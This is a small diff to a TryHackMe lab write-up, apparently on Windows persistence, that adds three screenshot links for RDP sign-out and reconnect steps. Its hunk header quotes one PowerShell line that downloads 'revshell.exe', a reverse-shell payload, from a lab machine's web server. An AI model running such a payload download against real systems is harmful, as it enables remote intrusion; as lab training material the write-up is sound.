@@ -137,11 +137,11 @@ PS C:\Users\Administrator> wget http://10.10.157.221:8000/revshell.exe -O revshe
 
 9. Sign out and log back in
 
-![]()
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Windows%20RDP%20Sign%20Out.png)
 
-![]()
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Windows%20RDP%20Reconnect.png)
 
-![]()
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Windows%20RDP%20Reconnected.png)
 
 ```Bash
 ```
